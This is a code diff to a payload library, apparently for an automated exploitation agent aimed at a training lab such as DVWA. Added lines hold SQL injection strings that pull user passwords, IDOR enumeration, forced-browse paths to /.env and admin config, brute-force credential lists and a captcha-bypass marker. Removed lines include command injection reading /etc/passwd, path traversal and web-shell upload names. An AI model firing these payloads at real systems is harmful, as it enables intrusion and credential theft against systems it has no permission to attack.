@@ -26,103 +26,76 @@ class PayloadLibrary:
     """Retrieve payloads by vulnerability class and security level."""
 
     _PAYLOAD_DB: dict[str, PayloadSet] = {
-        "sqli": PayloadSet(
-            probe=["1'", '1"', "1 OR 1=1"],
-            exploit=[
-                "1' UNION SELECT user(),database()-- -",
-                "1' UNION SELECT user,password FROM users-- -",
-            ],
+        "sqli_union": PayloadSet(
+            probe=["1' UNION SELECT null-- -", "1' UNION SELECT 1,2-- -"],
+            exploit=["1' UNION SELECT user(),database()-- -", "1' UNION SELECT user,password FROM users-- -"],
             bypass={
                 "medium": ["1 UNION SELECT user,password FROM users#"],
                 "high": ["1' UNION SELECT user,password FROM users LIMIT 1-- -"],
             },
         ),
-        "sqli_blind": PayloadSet(
+        "sqli_error": PayloadSet(
+            probe=["1'", "1''", "1\""],
+            exploit=["1' AND 1=0 UNION SELECT null,version()-- -"],
+            bypass={
+                "medium": ["1 AND 1=0 UNION SELECT null,version()#"],
+                "high": ["1' AND 1=0 UNION SELECT null,version() LIMIT 1-- -"],
+            },
+        ),
+        "sqli_boolean_blind": PayloadSet(
             probe=["1' AND 1=1-- -", "1' AND 1=2-- -"],
-            exploit=["1' AND SLEEP(3)-- -", "1' AND ASCII(SUBSTR(database(),1,1))>77-- -"],
+            exploit=["1' AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a'-- -"],
+            bypass={
+                "medium": ["1 AND 1=1#", "1 AND 1=2#"],
+                "high": ["1'/**/AND/**/1=1-- -"],
+            },
+        ),
+        "sqli_time_blind": PayloadSet(
+            probe=["1' AND SLEEP(1)-- -", "1' AND pg_sleep(1)-- -"],
+            exploit=["1' AND IF(ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>77,SLEEP(3),0)-- -"],
             bypass={
                 "medium": ["1 AND SLEEP(3)#"],
                 "high": ["1'/**/AND/**/SLEEP(3)-- -"],
             },
         ),
-        "xss_r": PayloadSet(
-            probe=["<script>alert(1)</script>"],
-            exploit=["<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"],
+        "ac_idor": PayloadSet(
+            probe=["id=1", "id=2", "id=3"],
+            exploit=["id=4", "id=5", "id=6"],
             bypass={
-                "medium": ["<img src=x onerror=alert(1)>"],
-                "high": ["\"><svg/onload=alert(1)>"],
+                "medium": ["id=7", "id=8", "id=9"],
+                "high": ["id=100", "id=200", "id=300"],
             },
         ),
-        "xss_s": PayloadSet(
-            probe=["<script>alert(1)</script>"],
-            exploit=["<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"],
+        "ac_vertical_escalation": PayloadSet(
+            probe=["role=user", "role=admin"],
+            exploit=["role=admin&user_id=1", "elevate=1"],
             bypass={
-                "medium": ["<img src=x onerror=alert(1)>"],
-                "high": ["<svg/onload=alert(1)>"],
+                "medium": ["role=admin%00user"],
+                "high": ["x-role: admin"],
             },
         ),
-        "xss_d": PayloadSet(
-            probe=["<script>alert(1)</script>"],
-            exploit=["<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"],
+        "ac_force_browse": PayloadSet(
+            probe=["/admin", "/config", "/backup"],
+            exploit=["/admin/config.php", "/.env"],
             bypass={
-                "medium": ["<img src=x onerror=alert(1)>"],
-                "high": ["<svg/onload=alert(1)>"],
+                "medium": ["/admin%2fconfig.php"],
+                "high": ["/admin/./config.php"],
             },
         ),
-        "cmdi": PayloadSet(
-            probe=["127.0.0.1; whoami", "127.0.0.1; id"],
-            exploit=["127.0.0.1; cat /etc/passwd"],
-            bypass={
-                "medium": ["127.0.0.1& whoami"],
-                "high": ["127.0.0.1|whoami"],
-            },
-        ),
-        "brute": PayloadSet(
+        "bf_dictionary": PayloadSet(
             probe=["admin:password", "admin:admin"],
-            exploit=["gordonb:abc123", "pablo:letmein"],
+            exploit=["gordonb:abc123", "pablo:letmein", "admin:password"],
             bypass={
-                "medium": ["respect_rate_limit"],
-                "high": ["respect_rate_limit"],
+                "medium": ["admin:password:delay=500ms"],
+                "high": ["admin:password:captcha=bypass"],
             },
         ),
-        "lfi": PayloadSet(
-            probe=["../../../etc/passwd"],
-            exploit=["../../../../../../var/log/apache2/access.log"],
+        "bf_spray": PayloadSet(
+            probe=["admin:password", "user:password"],
+            exploit=["admin:password", "user:password", "test:test"],
             bypass={
-                "medium": ["....//....//....//etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd"],
-                "high": ["file:///etc/passwd"],
-            },
-        ),
-        "upload": PayloadSet(
-            probe=["shell.php"],
-            exploit=["shell.php?cmd=id"],
-            bypass={
-                "medium": ["shell.php.jpg", "shell.phtml"],
-                "high": ["shell.php%00.jpg", "mime:image/jpeg"],
-            },
-        ),
-        "csrf": PayloadSet(
-            probe=["password_new=hacked&password_conf=hacked&Change=Change"],
-            exploit=["token_theft_via_xss"],
-            bypass={
-                "medium": ["token_reuse_attempt"],
-                "high": ["xss_token_exfiltration"],
-            },
-        ),
-        "weak_session": PayloadSet(
-            probe=["generate_session_sequence"],
-            exploit=["predict_next_session"],
-            bypass={
-                "medium": ["timestamp_correlation"],
-                "high": ["entropy_sampling"],
-            },
-        ),
-        "idor": PayloadSet(
-            probe=["id=1", "id=2"],
-            exploit=["id=3", "id=4"],
-            bypass={
-                "medium": ["horizontal_increment"],
-                "high": ["sparse_id_scan"],
+                "medium": ["admin:password:delay=500ms"],
+                "high": ["admin:password:captcha=bypass"],
             },
         ),
     }
@@ -156,8 +129,8 @@ class PayloadLibrary:
         )
 
     @staticmethod
-    def record_tried(state: dict, module: str, payload: str) -> dict:
-        """Produce a partial state update recording *payload* as tried for *module*.
+    def record_tried(state: dict, agent_id: str, payload: str) -> dict:
+        """Produce a partial state update recording *payload* as tried for *agent_id*.
 
         This is a pure function that returns a new dict without mutating *state*.
         The returned dict can be merged into LangGraph state via the appropriate
@@ -165,17 +138,17 @@ class PayloadLibrary:
 
         Args:
             state: Current exploitation state (read-only).
-            module: Module name (e.g. ``"sqli"``).
+            agent_id: Agent ID (e.g. ``"sqli_union"``).
             payload: Payload string that was attempted.
 
         Returns:
-            Partial state update: ``{"tried_payloads": {module: [...tried + payload]}}``
+            Partial state update: ``{"tried_payloads": {agent_id: [...tried + payload]}}``
         """
         tried = dict(state.get("tried_payloads", {}))
-        module_tried = list(tried.get(module, []))
-        if payload not in module_tried:
-            module_tried.append(payload)
-        tried[module] = module_tried
+        agent_tried = list(tried.get(agent_id, []))
+        if payload not in agent_tried:
+            agent_tried.append(payload)
+        tried[agent_id] = agent_tried
         return {"tried_payloads": tried}
 
     @staticmethod
